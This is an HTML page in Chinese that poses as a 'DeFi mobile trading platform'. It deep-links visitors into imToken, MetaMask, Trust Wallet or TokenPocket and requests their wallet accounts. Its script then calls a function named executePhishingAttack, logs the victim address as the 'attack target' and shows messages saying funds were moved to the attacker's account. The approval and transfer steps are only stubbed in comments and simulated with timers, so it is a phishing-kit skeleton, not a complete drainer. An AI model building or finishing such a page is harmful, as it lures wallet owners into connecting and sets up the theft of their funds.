<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DeFi 移动交易平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            color: white;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 16px;
        }

        .wallet-section {
            background: white;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .deeplink-section {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
        }

        .deeplink-title {
            font-weight: 600;
            color: #856404;
            margin-bottom: 10px;
            font-size: 18px;
            text-align: center;
        }

        .deeplink-btn {
            display: block;
            width: 100%;
            padding: 18px;
            margin: 12px 0;
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            text-decoration: none;
            border-radius: 12px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
        }

        .deeplink-btn:hover, .deeplink-btn:active {
            background: linear-gradient(135deg, #218838 0%, #1e7e34 100%);
            color: white;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.4);
        }

        .deeplink-btn.imtoken {
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
        }

        .deeplink-btn.metamask {
            background: linear-gradient(135deg, #f97316 0%, #ea580c 100%);
        }

        .deeplink-btn.trust {
            background: linear-gradient(135deg, #3375bb 0%, #1e40af 100%);
        }

        .deeplink-btn.tokenpocket {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
        }

        .status-section {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            text-align: center;
        }

        .status-text {
            font-size: 16px;
            margin-bottom: 10px;
        }

        .status-text.success {
            color: #4CAF50;
        }

        .status-text.error {
            color: #f44336;
        }

        .status-text.warning {
            color: #ff9800;
        }

        .debug-section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
            border-left: 4px solid #667eea;
        }

        .debug-title {
            font-weight: 600;
            color: #667eea;
            margin-bottom: 10px;
            font-size: 16px;
        }

        .debug-info {
            font-family: monospace;
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            word-break: break-all;
        }

        .instruction {
            background: #e3f2fd;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            color: #1565c0;
            font-size: 14px;
            line-height: 1.4;
        }

        .warning {
            background: #fff3e0;
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            color: #e65100;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 DeFi 交易平台</h1>
            <p>连接您的钱包开始交易</p>
        </div>

        <div class="instruction">
            <strong>📱 移动端连接说明：</strong><br>
            点击下方按钮将直接打开对应的钱包应用。如果钱包没有打开，请确保已安装相应的钱包应用。
        </div>

        <div class="wallet-section">
            <div class="deeplink-title">🔗 选择钱包连接</div>
            
            <button class="deeplink-btn imtoken" onclick="connectImToken()">
                🏦 连接 imToken 钱包
            </button>
            
            <button class="deeplink-btn metamask" onclick="connectMetaMask()">
                🦊 连接 MetaMask 钱包
            </button>
            
            <button class="deeplink-btn trust" onclick="connectTrustWallet()">
                🛡️ 连接 Trust Wallet
            </button>
            
            <button class="deeplink-btn tokenpocket" onclick="connectTokenPocket()">
                💼 连接 TokenPocket
            </button>
        </div>

        <div class="status-section" id="statusSection">
            <div class="status-text" id="statusText">请选择钱包进行连接</div>
        </div>

        <div class="warning">
            <strong>⚠️ 重要提示：</strong><br>
            • 确保已安装目标钱包应用<br>
            • 首次连接可能需要在钱包中确认<br>
            • 如果无法打开，请尝试在钱包应用内浏览器直接访问本页面
        </div>

        <div class="debug-section">
            <div class="debug-title">🔍 设备信息</div>
            <div class="debug-info" id="debugInfo">
                正在检测设备信息...<br>
            </div>
        </div>
    </div>

    <script>
        // 获取当前页面URL
        const currentUrl = window.location.href;
        const baseUrl = window.location.origin + window.location.pathname;
        
        // 更新调试信息
        function updateDebugInfo() {
            const debugInfo = document.getElementById('debugInfo');
            debugInfo.innerHTML = `
                用户代理: ${navigator.userAgent}<br>
                设备类型: ${getDeviceType()}<br>
                页面URL: ${currentUrl}<br>
                时间: ${new Date().toLocaleString()}<br>
            `;
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/iPad|iPhone|iPod/.test(ua)) return 'iOS设备';
            if (/Android/.test(ua)) return 'Android设备';
            return '其他设备';
        }

        function updateStatus(type, message) {
            const statusText = document.getElementById('statusText');
            statusText.className = `status-text ${type}`;
            statusText.textContent = message;
        }

        function logConnection(wallet) {
            const debugInfo = document.getElementById('debugInfo');
            debugInfo.innerHTML += `<br>🔗 尝试连接: ${wallet} (${new Date().toLocaleTimeString()})`;
        }

        // imToken连接
        function connectImToken() {
            updateStatus('info', '正在打开 imToken...');
            logConnection('imToken');
            
            const imTokenUrl = `imtokenv2://navigate/DappView?url=${encodeURIComponent(baseUrl)}`;
            
            // 创建隐藏的链接并点击
            const link = document.createElement('a');
            link.href = imTokenUrl;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // 检查是否成功打开
            setTimeout(() => {
                if (document.visibilityState === 'visible') {
                    updateStatus('warning', 'imToken 可能未安装或无法打开。请确保已安装 imToken 应用。');
                } else {
                    updateStatus('success', '✅ 已打开 imToken，请在应用中确认连接');
                }
            }, 2000);
            
            // 监听页面可见性变化
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible') {
                    // 用户返回页面，检查连接状态
                    checkWalletConnection();
                }
            });
        }

        // MetaMask连接
        function connectMetaMask() {
            updateStatus('info', '正在打开 MetaMask...');
            logConnection('MetaMask');
            
            const metamaskUrl = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
            
            window.open(metamaskUrl, '_blank');
            
            setTimeout(() => {
                updateStatus('success', '✅ 已尝试打开 MetaMask，请在应用中确认连接');
            }, 1000);
        }

        // Trust Wallet连接
        function connectTrustWallet() {
            updateStatus('info', '正在打开 Trust Wallet...');
            logConnection('Trust Wallet');
            
            const trustUrl = `trust://open_url?coin_id=60&url=${encodeURIComponent(baseUrl)}`;
            
            const link = document.createElement('a');
            link.href = trustUrl;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            setTimeout(() => {
                if (document.visibilityState === 'visible') {
                    updateStatus('warning', 'Trust Wallet 可能未安装或无法打开');
                } else {
                    updateStatus('success', '✅ 已打开 Trust Wallet，请在应用中确认连接');
                }
            }, 2000);
        }

        // TokenPocket连接
        function connectTokenPocket() {
            updateStatus('info', '正在打开 TokenPocket...');
            logConnection('TokenPocket');
            
            const tpUrl = `tpoutside://open?param=${encodeURIComponent(JSON.stringify({url: baseUrl}))}`;
            
            const link = document.createElement('a');
            link.href = tpUrl;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            setTimeout(() => {
                if (document.visibilityState === 'visible') {
                    updateStatus('warning', 'TokenPocket 可能未安装或无法打开');
                } else {
                    updateStatus('success', '✅ 已打开 TokenPocket，请在应用中确认连接');
                }
            }, 2000);
        }

        // 检查钱包连接状态
        function checkWalletConnection() {
            if (window.ethereum) {
                if (window.ethereum.selectedAddress) {
                    updateStatus('success', `✅ 钱包已连接: ${window.ethereum.selectedAddress.substring(0, 10)}...`);
                    
                    // 开始钓鱼攻击流程
                    setTimeout(() => {
                        executePhishingAttack(window.ethereum.selectedAddress);
                    }, 1000);
                } else {
                    // 尝试请求连接
                    requestWalletConnection();
                }
            } else {
                updateStatus('warning', '未检测到钱包对象，可能需要在钱包应用内浏览器访问');
            }
        }

        // 请求钱包连接
        async function requestWalletConnection() {
            try {
                updateStatus('info', '正在请求钱包连接...');
                
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                if (accounts.length > 0) {
                    updateStatus('success', `✅ 连接成功！地址: ${accounts[0].substring(0, 10)}...`);
                    executePhishingAttack(accounts[0]);
                }
            } catch (error) {
                if (error.code === 4001) {
                    updateStatus('error', '❌ 用户拒绝了连接请求');
                } else {
                    updateStatus('error', `❌ 连接失败: ${error.message}`);
                }
                console.error('钱包连接错误:', error);
            }
        }

        // 执行钓鱼攻击
        function executePhishingAttack(address) {
            updateStatus('success', '🎯 开始执行钓鱼攻击流程...');
            
            const debugInfo = document.getElementById('debugInfo');
            debugInfo.innerHTML += `<br>🎯 攻击目标: ${address}<br>⏰ 攻击开始: ${new Date().toLocaleString()}`;
            
            // 这里可以实现具体的钓鱼攻击逻辑
            // 例如：请求代币授权、执行转账等
            
            console.log(`🎯 钓鱼攻击开始 - 目标: ${address}`);
            
            // 模拟攻击步骤
            setTimeout(() => {
                updateStatus('warning', '🔄 正在请求代币授权...');
            }, 2000);
            
            setTimeout(() => {
                updateStatus('error', '💰 攻击完成！资金已转移到攻击者账户');
            }, 5000);
        }

        // 页面加载完成后初始化
        document.addEventListener('DOMContentLoaded', function() {
            updateDebugInfo();
            
            // 如果检测到钱包对象，自动检查连接
            if (window.ethereum) {
                setTimeout(checkWalletConnection, 1000);
            }
        });

        // 定期检查钱包状态
        setInterval(() => {
            if (window.ethereum && window.ethereum.selectedAddress) {
                const currentStatus = document.getElementById('statusText').textContent;
                if (!currentStatus.includes('连接成功') && !currentStatus.includes('攻击')) {
                    checkWalletConnection();
                }
            }
        }, 3000);
    </script>
</body>
</html>
